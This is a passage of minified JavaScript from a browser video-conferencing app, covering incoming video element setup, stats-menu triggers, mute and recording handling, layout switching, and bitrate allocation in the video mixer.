session.rpcs[UUID]){getById("menuStatsBox")&&(clearInterval(getById("menuStatsBox").interval),getById("menuStatsBox").remove());var[menu,innerMenu]=statsMenuCreator();printViewStats(innerMenu,UUID),menu.interval=setInterval(printViewStats,session.statsInterval,innerMenu,UUID)}if(v.touchTimeOut=null,v.touchLastTap=0,v.touchCount=0,v.addEventListener("touchend",(function(event){if(!session.disableMouseEvents){log("touched"),document.onmousemove=null,document.ontouchmove=null;var currentTime=(new Date).getTime(),tapLength=currentTime-v.touchLastTap;if(clearTimeout(v.touchTimeOut),tapLength<500&&tapLength>0){if(log("double touched"),v.touchCount+=1,event.preventDefault(),v.touchCount<5)return v.touchLastTap=currentTime,!1;if(v.touchLastTap=0,v.touchCount=0,log("double touched"),!1!==session.statsMenu){var uid=event.currentTarget.dataset.UUID;if("stats"in session.rpcs[uid]){var[menu,innerMenu]=statsMenuCreator();printViewStats(innerMenu,uid),menu.interval=setInterval(printViewStats,session.statsInterval,innerMenu,uid)}}return event.stopPropagation(),!1}v.touchCount=1,v.touchTimeOut=setTimeout((function(vv){clearTimeout(vv.touchTimeOut),vv.touchLastTap=0,vv.touchCount=0}),5e3,v),v.touchLastTap=currentTime}})),0==v.controls&&(v.addEventListener("click",(function(){v.paused&&(log("PLAYING MANUALLY?"),v.play().then((_=>{log("playing 5")})).catch(warnlog))})),0==session.nocursor&&(session.cleanOutput||session.studioSoftware||!1===session.showControls||navigator.userAgent.toLowerCase().indexOf(" electron/")>-1||(v.controlTimer&&clearInterval(v.controlTimer),v.controlTimer=setTimeout(showControlBar.bind(null,v),1e3)))),v.addEventListener("animationend",(function(e){v.classList.remove("fadein"),v.holder&&v.holder.classList.remove("fadein")})),applyMuteState(UUID),v.usermuted=!1,v.addEventListener("volumechange",(function(e){var muteState=checkMuteState(UUID);this.muted&&this.muted!==muteState?this.usermuted=!0:this.muted||(this.usermuted=!1)})),session.screenShareStartPaused&&pauseVideo(v,!1),session.director)if(session.customWSS&&"isScene"in msg&&!1!==msg.isScene);else{var soloLink=soloLinkGenerator(session.rpcs[UUID].streamID);createControlBoxScreenshare(UUID,soloLink,session.rpcs[UUID].streamID)}(session.autorecord||session.autorecordremote)&&(log("AUTO RECORD START"),setTimeout((function(UUID,v){var videoKbps=4e3;!1!==session.recordLocal&&(videoKbps=session.recordLocal),session.director?recordVideo(document.querySelector("[data-action-type='recorder-local'][data--u-u-i-d='"+UUID+"']"),null,videoKbps):v.stopWriter||v.recording||(v.startWriter?v.startWriter():recordLocalVideo(null,videoKbps,v))}),2e3,UUID,v)),session.rpcs[UUID]&&(clearTimeout(session.rpcs[UUID].getStatsTimeout),session.rpcs[UUID].getStatsTimeout=setTimeout(processStats,100,UUID))}function setupIncomingVideoTracking(v,UUID){(session.directorList.indexOf(UUID)>=0&&(v.muted=!1),v.onpause=event=>{if(v.dataset.UUID&&session.rpcs[v.dataset.UUID]&&0===session.rpcs[v.dataset.UUID].manualBandwidth)return!0;if(CtrlPressed){if(Firefox&&CtrlPressed){if(log("CLICK 351"),!1!==session.statsMenu){var uid=event.currentTarget.dataset.UUID;if(event.preventDefault(),"stats"in session.rpcs[uid]){var[menu,innerMenu]=statsMenuCreator();printViewStats(innerMenu,uid),menu.interval=setInterval(printViewStats,session.statsInterval,innerMenu,uid)}}return event.stopPropagation(),!1}}else warnlog("Video paused; force it to play again"),event.currentTarget.play().then((_=>{log("playing 6")})).catch((error=>{warnlog("didnt play 1")})),unPauseVideo(v);return!0},session.pip&&(v.onloadedmetadata=function(){v.paused||v.pip||(v.pip=!0,toggleSystemPip(v,!0))}),v.addEventListener("resize",(e=>{var v=e.target,aspectRatio=parseFloat(v.videoWidth/v.videoHeight)||0;log("resize event: "+aspectRatio),aspectRatio?(session.keepIncomingVideosInLandscape&&(v.rotated=aspectRatio<1?session.keepIncomingVideosInLandscape:0),v.resetAR?(log("ASPECT RATIO UNMUTED"),delete v.resetAR,v.dataset.aspectRatio=aspectRatio,pokeIframeAPI("aspect-ratio",v.dataset.aspectRatio,v.dataset.UUID,v.dataset.sid),setTimeout((function(){updateMixer()}),1)):v.dataset.aspectRatio?aspectRatio!=parseFloat(v.dataset.aspectRatio)&&(log("ASPECT RATIO CHANGED"),v.dataset.aspectRatio=aspectRatio,pokeIframeAPI("aspect-ratio",v.dataset.aspectRatio,v.dataset.UUID,v.dataset.sid),setTimeout((function(){updateMixer()}),1)):(log("NEW VIDEO ? ASPECT RATIO new"),v.dataset.aspectRatio=aspectRatio,pokeIframeAPI("aspect-ratio",v.dataset.aspectRatio,v.dataset.UUID,v.dataset.sid),setTimeout((function(){updateMixer()}),1))):v.resetAR=!0})),"number"==typeof session.volume?v.volume=session.volume:v.volume=1,v.autoplay=!0,v.controls=session.showControls||!1,v.classList.add("tile"),v.setAttribute("playsinline",""),v.controlTimer=null,v.dataset.menu="context-menu-video",session.cleanOutput||v.classList.add("task"),document.getElementById("mainmenu"))&&(getById("mainmenu").remove(),document.querySelectorAll(".hidden2").forEach((ele2=>{ele2.classList.remove("hidden2")})));if(session.director){!1===session.showControls?v.controls=!1:v.controls=!0;var container=getById("videoContainer_"+UUID);v.container=container,v.disablePictureInPicture=!1,v.setAttribute("controls","controls"),container.appendChild(v),pokeIframeAPI("control-box-video-updated",v.id,UUID),container.classList.add("hasMedia"),session.requestRateLimit(session.directorViewBitrate,UUID),v.title="Hold CTRL or CMD (âŒ˜) while clicking the video to open detailed stats",session.beepToNotify&&playtone()}else!1!==session.scene?(v.controls=session.showControls||!1,session.view||"0"===session.scene||!1!==session.scene&&session.autoadd&&session.rpcs[UUID].streamID&&session.autoadd.includes(session.rpcs[UUID].streamID)?v.style.display="block":(v.style.display="none",session.rpcs[UUID].mutedStateScene=!0)):!1!==session.roomid?session.cleanOutput||session.studioSoftware?v.controls=session.showControls||!1:null!==session.showControls?v.controls=session.showControls:v.controls=!0:v.style.display="block";if(v.addEventListener("click",(function(e){log("clicked");try{var uid=e.currentTarget.dataset.UUID;if(e.ctrlKey||e.metaKey){if(e.preventDefault(),!1!==session.statsMenu&&"stats"in session.rpcs[uid]){var[menu,innerMenu]=statsMenuCreator();printViewStats(innerMenu,uid),menu.interval=setInterval(printViewStats,session.statsInterval,innerMenu,uid)}return e.stopPropagation(),!1}"prePausedBandwidth"in session.rpcs[uid]&&unPauseVideo(e.currentTarget)}catch(e){errorlog(e)}})),session.statsMenu&&"stats"in session.rpcs[UUID]){getById("menuStatsBox")&&(clearInterval(getById("menuStatsBox").interval),getById("menuStatsBox").remove());var[menu,innerMenu]=statsMenuCreator();printViewStats(innerMenu,UUID),menu.interval=setInterval(printViewStats,session.statsInterval,innerMenu,UUID)}v.touchTimeOut=null,v.touchLastTap=0,v.touchCount=0,v.addEventListener("touchend",(function(event){if(!session.disableMouseEvents){log("touched"),document.onmousemove=null,document.ontouchmove=null;var currentTime=(new Date).getTime(),tapLength=currentTime-v.touchLastTap;if(clearTimeout(v.touchTimeOut),tapLength<500&&tapLength>0){if(log("double touched"),v.touchCount+=1,event.preventDefault(),v.touchCount<5)return v.touchLastTap=currentTime,!1;if(v.touchLastTap=0,v.touchCount=0,log("double touched"),!1!==session.statsMenu){var uid=event.currentTarget.dataset.UUID;if("stats"in session.rpcs[uid]){var[menu,innerMenu]=statsMenuCreator();printViewStats(innerMenu,uid),menu.interval=setInterval(printViewStats,session.statsInterval,innerMenu,uid)}}return event.stopPropagation(),!1}v.touchCount=1,v.touchTimeOut=setTimeout((function(vv){clearTimeout(vv.touchTimeOut),vv.touchLastTap=0,vv.touchCount=0}),5e3,v),v.touchLastTap=currentTime}})),session.rpcs[UUID].stats.info&&"remote"in session.rpcs[UUID].stats.info&&session.rpcs[UUID].stats.info.remote&&v.addEventListener("wheel",remoteFocusZoomRequest),0==v.controls&&(v.addEventListener("click",(function(){log("click 33"),v.paused&&(log("PLAYING MANUALLY?"),v.play().then((_=>{log("playing 7")})).catch(warnlog))})),0==session.nocursor&&(session.cleanOutput||session.studioSoftware||!1===session.showControls||navigator.userAgent.toLowerCase().indexOf(" electron/")>-1||(v.controlTimer&&clearInterval(v.controlTimer),v.controlTimer=setTimeout(showControlBar.bind(null,v),1e3)))),v.addEventListener("animationend",(function(e){v.classList.remove("fadein"),v.holder&&v.holder.classList.remove("fadein")})),applyMuteState(UUID),v.usermuted=!1,session.screenShareStartPaused&&session.rpcs[UUID].screenShareState&&pauseVideo(v,!1),v.addEventListener("volumechange",(function(e){var muteState=checkMuteState(UUID);this.muted&&this.muted!==muteState?this.usermuted=!0:this.muted||(this.usermuted=!1)})),(session.autorecord||session.autorecordremote)&&(log("AUTO RECORD START"),setTimeout((function(UUID,v){var videoKbps=4e3;!1!==session.recordLocal&&(videoKbps=session.recordLocal),session.director?recordVideo(document.querySelector("[data-action-type='recorder-local'][data--u-u-i-d='"+UUID+"']"),null,videoKbps):v.stopWriter||v.recording||(v.startWriter?v.startWriter():recordLocalVideo(null,videoKbps,v))}),2e3,UUID,v)),session.rpcs[UUID]&&(clearTimeout(session.rpcs[UUID].getStatsTimeout),session.rpcs[UUID].getStatsTimeout=setTimeout(processStats,100,UUID))}function remoteFocusZoomRequest(event){event.preventDefault();var scale=parseFloat(-.001*event.deltaY);log(event.currentTarget),event.ctrlKey||event.metaKey?session.requestFocusChange(scale,event.currentTarget.dataset.UUID):session.requestZoomChange(scale,event.currentTarget.dataset.UUID)}function mediaAudioTrackUpdated(UUID,streamID){pokeIframeAPI("new-audio-track-added",!0,UUID,streamID)}function mediaVideoTrackUpdated(UUID,streamID){pokeIframeAPI("new-video-track-added",!0,UUID,streamID)}function mediaSourceUpdated(UUID,streamID){pokeIframeAPI("new-stream-added",!0,UUID,streamID),pokeAPI("streamAdded",streamID)}function showControlBar(vel){try{vel.controls=!0}catch(e){errorlog(e)}}function createRichVideoElement(UUID){return session.rpcs[UUID].videoElement||(log("video element is being created and any media tracks added"),session.rpcs[UUID].videoElement=createVideoElement(),session.rpcs[UUID].videoElement.dataset.UUID=UUID,session.rpcs[UUID].videoElement.id="videosource_"+UUID,session.rpcs[UUID].streamID&&(session.rpcs[UUID].videoElement.dataset.sid=session.rpcs[UUID].streamID),!1!==session.rpcs[UUID].rotate&&(session.rpcs[UUID].videoElement.rotated=session.rpcs[UUID].rotate),session.rpcs[UUID].videoElement.addEventListener("playing",(e=>{try{var bigPlayButton=document.getElementById("bigPlayButton");bigPlayButton&&bigPlayButton.parentNode.removeChild(bigPlayButton)}catch(e){}resetupAudioOut(e.target,!0);try{session.pip&&v.readyState>=3&&(v.pip||(v.pip=!0,toggleSystemPip(v,!0)))}catch(e){}}),{once:!0}),(session.rpcs[UUID].mirrorState||!1===session.rpcs[UUID].mirrorState)&&applyMirrorGuest(session.rpcs[UUID].mirrorState,session.rpcs[UUID].videoElement),session.posterImage&&(session.rpcs[UUID].videoElement.poster=session.posterImage),setupIncomingVideoTracking(session.rpcs[UUID].videoElement,UUID),pokeIframeAPI("video-element-created","videosource_"+UUID,UUID)),session.rpcs[UUID].videoElement}function updateVolume(update=!1){if(!1!==session.audioGain){if(update&&session.roomid){var pswd=session.password||"";generateHash(session.streamID+session.roomid+pswd+session.salt,6).then((function(hash){setStorage("micVolume_"+hash,session.audioGain,hours=6)}))}0===session.audioGain?(getById("header").classList.add("orange"),getById("head7").classList.remove("hidden")):(getById("header").classList.remove("orange"),getById("head7").classList.add("hidden"))}else{pswd=session.password||"";generateHash(session.streamID+session.roomid+pswd+session.salt,6).then((function(hash){var volume=getStorage("micVolume_"+hash);if(""!==volume){if(0===parseInt(volume))getById("header").classList.add("orange"),getById("head7").classList.remove("hidden");else{if(!parseInt(volume))return;getById("header").classList.remove("orange"),getById("head7").classList.add("hidden")}session.audioGain=parseInt(volume);var vol=parseFloat(session.audioGain/100)||0;for(var waid in session.webAudios)log("Adjusting Gain; only track 0 in all likely hood, unless more than track 0 support is added."),session.webAudios[waid].gainNode.gain.setValueAtTime(vol,session.webAudios[waid].audioContext.currentTime)}}))}}function hideHomeCheck(){if(session.hidehome&&(getById("logoname").classList.add("permahide"),getById("container-1").classList.add("permahide"),getById("container-4").classList.add("permahide"),getById("dropButton").classList.add("permahide"),getById("head1").classList.add("permahide"),!1===session.permaid&&0==session.roomid?getById("mainmenu").classList.add("permahide"):getById("mainmenu").classList.remove("permahide"),getById("audioScreenCaptureDocs").classList.add("permahide"),getById("audioScreenCaptureDocs2").classList.add("permahide"),getById("translateButton").classList.add("permahide"),getById("calendarButton").classList.add("permahide"),getById("info").classList.add("permahide"),getById("helpbutton").classList.add("permahide")),urlParams.has("headertitle")){let pageTitle=urlParams.get("headertitle")||"";pageTitle=decodeURIComponent(pageTitle)||"",document.title=pageTitle,getById("metaTitle").content=pageTitle}if(urlParams.has("favicon")){let favicon="";urlParams.get("favicon")&&(favicon=decodeURIComponent(urlParams.get("favicon"))||""),getById("favicon1").href=favicon,getById("favicon2").href=favicon,getById("favicon3").href=favicon}}function switchModes(state=null){if(session.switchMode=null===state?!session.switchMode:state,session.switchMode)getById("directorlayout").classList.add("hidden"),getById("gridlayout").classList.remove("hidden"),updateMixer();else{for(var UUID in getById("directorlayout").classList.remove("hidden"),getById("gridlayout").classList.add("hidden"),session.rpcs){if(session.rpcs[UUID].videoElement)session.rpcs[UUID].videoElement.style="",session.rpcs[UUID].videoElement.alreadyAdded=!1,(target=document.querySelector("#container_"+UUID+" .controlVideoBox"))&&(target.prepend(session.rpcs[UUID].videoElement),session.signalMeter&&session.rpcs[UUID].signalMeter&&target.appendChild(session.rpcs[UUID].signalMeter),session.batteryMeter&&session.rpcs[UUID].batteryMeter&&target.appendChild(session.rpcs[UUID].batteryMeter),session.rpcs[UUID].voiceMeter&&target.appendChild(session.rpcs[UUID].voiceMeter),session.rpcs[UUID].remoteMuteElement&&target.appendChild(session.rpcs[UUID].remoteMuteElement))}var target;if(session.videoElement)if(session.videoElement.style="",session.videoElement.alreadyAdded=!1,1==session.showDirector)(target=document.querySelector("#videoContainer_director"))&&session.videoElement&&target.prepend(session.videoElement);else(session.videoElement.srcObject&&session.videoElement.srcObject.getTracks().length||1==getById("press2talk").dataset.enabled)&&getById("miniPerformer").prepend(session.videoElement);if(session.screenShareElement)if(session.screenShareElement.style="",session.screenShareElement.alreadyAdded=!1,1==session.showDirector)(target=document.querySelector("#videoScreenContainer_director"))&&session.screenShareElement&&session.screenShareElement.srcObject&&session.screenShareElement.srcObject.getTracks().length&&target.prepend(session.screenShareElement);else(session.screenShareElement.srcObject&&session.screenShareElement.srcObject.getTracks().length||1==getById("press2talk").dataset.enabled)&&getById("miniPerformer").prepend(session.videoElement);applyQualityDirector()}}var updateMixerTimer=null,updateMixerActive=!1;function updateMixer(e=!1){var controlBar=document.getElementById("subControlButtons");if(controlBar&&controlBar.dragElement&&!controlBar.isDragging){let vw=Math.max(document.documentElement.clientWidth||0,window.innerWidth||0),vh=Math.max(document.documentElement.clientHeight||0,window.innerHeight||0),topOffset=0,leftOffset=0,elementOffset=controlBar;for(;elementOffset;)topOffset+=elementOffset.offsetTop,leftOffset+=elementOffset.offsetLeft,elementOffset=elementOffset.offsetParent;let realX=controlBar.xOffset+leftOffset,realY=controlBar.yOffset+topOffset,maxX=vw-controlBar.offsetWidth,maxY=vh-controlBar.offsetHeight;realX>maxX?controlBar.xOffset=maxX-leftOffset:realX<0&&(controlBar.xOffset=0-leftOffset),realY>maxY?controlBar.yOffset=maxY-topOffset:realY<0&&(controlBar.yOffset=0-topOffset),controlBar.style.transform=`translate(${controlBar.xOffset}px, ${controlBar.yOffset}px)`}if(!0!==session.manual&&(session.switchMode||!session.director)&&!session.windowed)if(clearInterval(updateMixerTimer),updateMixerActive)updateMixerTimer=session.mobile?setTimeout((function(){updateMixer()}),200):setTimeout((function(){updateMixer()}),50);else{updateMixerActive=!0,log("updating mixer");try{updateMixerRun(e)}catch(e){}session.mobile?setTimeout((function(){updateMixerActive=!1}),500):setTimeout((function(){updateMixerActive=!1}),100)}}function updateMixerRun(e=!1){try{if(session.switchMode);else{if(session.director)return;if(!0===session.manual)return}var header=getById("header"),playarea=getById("gridlayout");if(session.pipWindow)var hi=0,w=session.pipWindow.clientHeight,h=session.pipWindow.clientWidth;else if(document.body.dataset.rotated){hi=header.offsetHeight,w=document.body.clientHeight;if(session.widget){w*=.75;try{let widget=document.getElementById("widget");widget||(widget=document.createElement("iframe"),widget.allow="autoplay;camera;microphone;fullscreen;picture-in-picture;display-capture;midi;",widget.id="widget",widget.src=parseURL4Iframe(session.widget),log(widget.src),document.body.appendChild(widget),playarea.style.left="0",playarea.style.width="75%"),widget.style.height="calc(100% - "+hi+"px)",widget.style.top=hi}catch(e){errorlog(e)}}h=document.body.clientWidth-hi;(session.dedicatedControlBarSpace||document.body.clientWidth<=700)&&!1!==session.dedicatedControlBarSpace&&document.getElementById("subControlButtons")&&!session.overlayControls&&(!document.getElementById("subControlButtons").yOffset||document.getElementById("subControlButtons").yOffset>-10)&&(h=document.body.clientWidth-hi-document.getElementById("subControlButtons").offsetHeight)}else{hi=header.offsetHeight,w=window.innerWidth;if(session.widget){w*=.75;try{let widget=document.getElementById("widget");widget||(widget=document.createElement("iframe"),widget.allow="autoplay;camera;microphone;fullscreen;picture-in-picture;display-capture;midi;",widget.id="widget",widget.src=parseURL4Iframe(session.widget),log(widget.src),document.body.appendChild(widget),playarea.style.left="0",playarea.style.width="75%"),widget.style.height="calc(100% - "+hi+"px)",widget.style.top=hi}catch(e){errorlog(e)}}h=window.innerHeight-hi;(session.dedicatedControlBarSpace||window.innerHeight<=700)&&!1!==session.dedicatedControlBarSpace&&document.getElementById("subControlButtons")&&!session.overlayControls&&(!document.getElementById("subControlButtons").yOffset||document.getElementById("subControlButtons").yOffset>-10)&&(h=window.innerHeight-hi-document.getElementById("subControlButtons").offsetHeight)}if(session.locked){var w123=w,h123=h;w>h*session.locked?w=h*session.locked:h>w/session.locked&&(h=w/session.locked),playarea.style.left=(w123-w)/2+"px",playarea.style.top=(h123-h)/2+"px",playarea.style.width=w+"px",playarea.style.height=h+"px",playarea.style.position="absolute",playarea.style.display="block"}var arW=16,arH=9;session.aspectRatio&&(1==session.aspectRatio?(arW=9,arH=16):2==session.aspectRatio?(arW=12,arH=12):3==session.aspectRatio&&(arW=12,arH=9));var groups=[...session.group];session.groupView.length&&groups.push(...session.groupView);var sssid=!1,soloVideo=!1;if(!0===session.infocus)soloVideo=!0;else if(session.infocus&&session.infocus in session.rpcs)if(groups.length||session.allowNoGroup)try{groups.some((item=>session.rpcs[session.infocus].group.includes(item)))&&(soloVideo=session.infocus)}catch(e){errorlog(e)}else soloVideo=session.infocus;else if(!0===session.infocus2)sssid=session.streamID;else if(session.infocus2&&session.infocus2 in session.rpcs)if(groups.length||session.allowNoGroup)try{groups.some((item=>session.rpcs[session.infocus2].group.includes(item)))&&(sssid=session.rpcs[session.infocus2].streamID)}catch(e){errorlog(e)}else sssid=session.rpcs[session.infocus2].streamID;var ww=w/arW,hh=h/arH,mediaPool=[],mediaPool_invisible=[],miniPreview=session.minipreview;if(miniPreview&&session.layout&&session.streamID&&session.streamID in session.layout&&(miniPreview=!1,session.videoElement.container&&"minipreview"==session.videoElement.container.id&&delete session.videoElement.container,document.getElementById("minipreview")&&document.getElementById("minipreview").remove()),session.iframeEle&&"none"!==session.iframeEle.style.display&&(!1!==session.order?session.iframeEle.order=session.order:session.iframeEle.order=0,session.activeSpeaker&&!session.activelySpeaking?mediaPool_invisible.push(session.iframeEle):mediaPool.push(session.iframeEle)),session.videoElement&&(session.videoElement.src||session.videoElement.srcObject)&&"none"!==session.videoElement.style.display&&(miniPreview&&!0!==soloVideo||(!1!==session.order?session.videoElement.order=session.order:session.videoElement.order=0,session.activeSpeaker&&!session.activelySpeaking||session.videoElement&&session.videoElement.srcObject&&0===session.videoElement.srcObject.getVideoTracks().length||soloVideo&&!0!==soloVideo||session.videoMuted&&1===session.style||mediaPool.push(session.videoElement))),session.screenShareState&&session.screenShareElement&&(session.screenShareElementHidden||(!1!==session.order?session.screenShareElement.order=session.order:session.screenShareElement.order=0,!1!==soloVideo||session.activeSpeaker&&!session.activelySpeaking||mediaPool.push(session.screenShareElement))),soloVideo&&soloVideo in session.rpcs)for(var j in mediaPool=[],(iOS||iPad)&&(miniPreview||(miniPreview=1)),session.rpcs){if(groups.length||session.allowNoGroup)try{if(!groups.some((item=>session.rpcs[j].group.includes(item))))continue}catch(e){errorlog(e)}if(j!=soloVideo)try{if(session.rpcs[j].videoElement&&"none"!==session.rpcs[j].videoElement.style.display){if(document.pictureInPictureElement&&document.pictureInPictureElement.id&&document.pictureInPictureElement.id==session.rpcs[j].videoElement.id){var bitratePIP=parseInt(session.zoomedBitrate/4);session.requestRateLimit(bitratePIP,j)}else session.requestRateLimit(0,j);session.rpcs[j].videoElement.srcObject&&session.rpcs[j].videoElement.srcObject.getAudioTracks().length}else session.rpcs[j].videoElement&&session.requestRateLimit(0,j,!0)}catch(e){errorlog(e)}else try{if(session.rpcs[j].iframeEle){session.rpcs[j].videoElement&&session.rpcs[j].videoElement.srcObject.getAudioTracks().length,session.requestRateLimit(0,j),mediaPool.push(session.rpcs[j].iframeEle);continue}if(session.rpcs[j].videoElement){!1!==session.rpcs[j].order?session.rpcs[j].videoElement.order=session.rpcs[j].order:session.rpcs[j].videoElement.order=0;var totalRoomBitrate=session.totalRoomBitrate;!1!==session.controlRoomBitrate&&!0!==session.controlRoomBitrate&&(totalRoomBitrate=Math.min(session.controlRoomBitrate,totalRoomBitrate));var targetBitrate=session.zoomedBitrate;totalRoomBitrate>session.zoomedBitrate&&(targetBitrate=totalRoomBitrate),mediaPool.push(session.rpcs[j].videoElement),session.rpcs[j].videoElement.style.visibility="visible",session.requestRateLimit(targetBitrate,j)}}catch(e){errorlog(e)}}else if(soloVideo&&!0===soloVideo)for(var j in session.rpcs){if(groups.length||session.allowNoGroup)try{if(!groups.some((item=>session.rpcs[j].group.includes(item))))continue}catch(e){errorlog(e)}try{if(session.rpcs[j].videoElement&&"none"!==session.rpcs[j].videoElement.style.display)if(document.pictureInPictureElement&&document.pictureInPictureElement.id&&document.pictureInPictureElement.id==session.rpcs[j].videoElement.id){bitratePIP=parseInt(session.zoomedBitrate/4);session.requestRateLimit(bitratePIP,j)}else session.requestRateLimit(0,j);else session.rpcs[j].videoElement&&session.requestRateLimit(0,j,!0)}catch(e){errorlog(e)}}else{var roomQuality=0,screenShareTotal=0;for(var i in session.rpcs)if(null!==session.rpcs[i]){if(groups.length||session.allowNoGroup)try{if(!groups.some((item=>session.rpcs[i].group.includes(item))))continue}catch(e){errorlog(e)}session.rpcs[i].videoElement&&"none"!==session.rpcs[i].videoElement.style.display&&session.rpcs[i].videoElement.srcObject&&session.rpcs[i].videoElement.srcObject.getVideoTracks().length&&(session.rpcs[i].videoMuted||session.rpcs[i].directorVideoMuted||session.rpcs[i].virtualHangup||session.rpcs[i].bandwidthMuted||"0"===session.rpcs[i].videoElement.style.opacity||(roomQuality+=1,session.rpcs[i].screenShareState&&(screenShareTotal+=1)))}if(!1!==session.broadcast)if(session.layout&&session.streamID in session.layout);else if(roomQuality>0&&!1!==session.nopreview){for(i=0;i<mediaPool.length;i++)mediaPool[i].nodeName&&"IFRAME"==mediaPool[i].nodeName&&(mediaPool[i].style.display="none");mediaPool=[]}0===roomQuality&&(roomQuality=1);totalRoomBitrate=session.totalRoomBitrate;!1!==session.controlRoomBitrate&&!0!==session.controlRoomBitrate&&(totalRoomBitrate=Math.min(session.controlRoomBitrate,totalRoomBitrate));var roomBitrate=totalRoomBitrate,sceneBitrate=!1,screenShareBitrate=!1;if(!session.bitrate||roomBitrate||session.totalSceneBitrate)if(!1!==session.screenShareBitrate)screenShareBitrate=session.screenShareBitrate,roomQuality-screenShareTotal>0&&(roomBitrate=parseInt(totalRoomBitrate/(roomQuality-screenShareTotal)),session.totalSceneBitrate&&(sceneBitrate=parseInt(session.totalSceneBitrate/(roomQuality-screenShareTotal)),!1!==session.bitrate&&(sceneBitrate=Math.min(session.bitrate,sceneBitrate))));else if(screenShareTotal)try{!1!==session.roomid&&!1===session.scene?roomQuality-screenShareTotal<=0?(roomBitrate=totalRoomBitrate,screenShareBitrate=totalRoomBitrate):(screenShareBitrate=totalRoomBitrate/(1.5*screenShareTotal),roomBitrate=parseInt((totalRoomBitrate-screenShareBitrate)/(roomQuality-screenShareTotal))):!1!==session.totalSceneBitrate?roomQuality-screenShareTotal<=0?(sceneBitrate=session.totalSceneBitrate,!1!==session.bitrate&&(sceneBitrate=Math.min(session.bitrate,sceneBitrate)),screenShareBitrate=sceneBitrate):(screenShareBitrate=parseInt(totalRoomBitrate/(1.5*screenShareTotal)),sceneBitrate=parseInt((totalRoomBitrate-screenShareBitrate)/(roomQuality-screenShareTotal)),!1!==session.bitrate&&(sceneBitrate=Math.min(session.bitrate,sceneBitrate),screenShareBitrate=Math.min(session.bitrate,screenShareBitrate))):screenShareBitrate=!1}catch(e){errorlog(e)}else roomBitrate=parseInt(totalRoomBitrate/roomQuality),session.totalSceneBitrate&&(sceneBitrate=parseInt(session.totalSceneBitrate/roomQuality),!1!==session.bitrate&&(sceneBitrate=Math.min(session.bitrate,sceneBitrate)));else roomBitrate=session.bitrate;session.minimumRoomBitrate&&(session.totalRoomBitrate&&roomBitrate<session.minimumRoomBitrate&&(roomBitrate=session.minimumRoomBitrate)>session.totalRoomBitrate&&(roomBitrate=session.totalRoomBitrate),session.totalSceneBitrate&&sceneBitrate<session.minimumRoomBitrate&&(sceneBitrate=session.minimumRoomBitrate)>session.totalSceneBitrate&&(sceneBitrate=session.totalSceneBitrate));i=null;var countOrder=0;try{var RPCSkeys=Object.keys(session.rpcs)}catch(e){return}for(var keyIndex=0;keyIndex<RPCSkeys.length;keyIndex++)if(i=RPCSkeys[keyIndex],null!==session.rpcs[i]){if(session.rpcs[i].mutedStateMixer=!1,groups.length||session.allowNoGroup)try{if(!groups.some((item=>session.rpcs[i].group.includes(item)))){!1!==session.scene?(session.groupAudio?session.requestRateLimit(session.hiddenSceneViewBitrate,i,!1):(session.requestRateLimit(session.hiddenSceneViewBitrate,i,!0),session.rpcs[i].mutedStateMixer=!0),session.hiddenSceneViewBitrate||(session.rpcs[i].videoElement.nogb=2)):session.groupAudio?session.requestRateLimit(0,i,!1):(session.requestRateLimit(0,i,!0),session.rpcs[i].mutedStateMixer=!0),applyMuteState(i);continue}}catch(e){}applyMuteState(i);var doNotPush=!1;if(session.rpcs[i].iframeEle)if("none"==session.rpcs[i].iframeEle.style.display);else if("0"===session.rpcs[i].iframeEle.style.opacity);else{session.rpcs[i].iframeEle.style.visibility="visible",!1!==session.rpcs[i].order?session.rpcs[i].iframeEle.order=session.rpcs[i].order:session.rpcs[i].iframeEle.order=0;try{session.activeSpeaker&&!session.rpcs[i].defaultSpeaker?mediaPool_invisible.push(session.rpcs[i].iframeEle):mediaPool.push(session.rpcs[i].iframeEle)}catch(e){errorlog(e)}}if(session.rpcs[i].imageElement){if(session.rpcs[i].videoElement&&session.rpcs[i].videoElement.srcObject.getAudioTracks().length,session.rpcs[i].videoMuted||session.rpcs[i].directorVideoMuted||session.rpcs[i].virtualHangup||session.rpcs[i].bandwidthMuted)continue;if(session.rpcs[i].videoElement&&"none"==session.rpcs[i].videoElement.style.display)continue;!1!==session.rpcs[i].order?session.rpcs[i].imageElement.order=session.rpcs[i].order:session.rpcs[i].imageElement.order=0,session.activeSpeaker&&!session.rpcs[i].defaultSpeaker||mediaPool.push(session.rpcs[i].imageElement),doNotPush=!0}if(session.rpcs[i].videoElement){if("0"===session.rpcs[i].videoElement.style.opacity)continue;try{session.rpcs[i].videoElement.style.visibility="visible"}catch(e){errorlog(e)}if(session.rpcs[i].virtualHangup||session.rpcs[i].bandwidthMuted||session.rpcs[i].directorVideoMuted)continue;if(session.style&&session.style>=2){if(session.rpcs[i].videoElement.srcObject&&(0==session.rpcs[i].videoElement.srcObject.getVideoTracks().length||session.rpcs[i].videoMuted)){if("none"==session.rpcs[i].videoElement.style.display)continue;createStyleCanvas(i)&&applyStyleEffect(i),!1!==session.rpcs[i].order?session.rpcs[i].canvas.order=session.rpcs[i].order:session.rpcs[i].canvas.order=0,session.activeSpeaker&&!session.rpcs[i].defaultSpeaker||mediaPool.push(session.rpcs[i].canvas),doNotPush=!0}}else 1==session.style?session.rpcs[i].videoElement.srcObject&&(0==session.rpcs[i].videoElement.srcObject.getVideoTracks().length||session.rpcs[i].videoMuted)&&(doNotPush=!0):session.rpcs[i].videoElement.srcObject&&(0==session.rpcs[i].videoElement.srcObject.getVideoTracks().length||session.rpcs[i].videoMuted)&&session.rpcs[i].screenShareState&&(doNotPush=!0);if(session.rpcs[i].opacityMuted="1","1"==session.rpcs[i].opacityDisconnect&&session.rpcs[i].videoElement&&(session.rpcs[i].videoElement.style.opacity="1"),session.rpcs[i].videoMuted){if(0==session.rpcs[i].videoElement.srcObject.getAudioTracks().length)continue;session.rpcs[i].videoElement.srcObject&&session.rpcs[i].videoElement.srcObject.getVideoTracks().forEach((track=>{session.rpcs[i].videoElement.srcObject.removeTrack(track),session.rpcs[i].videoElement.load()}))}else 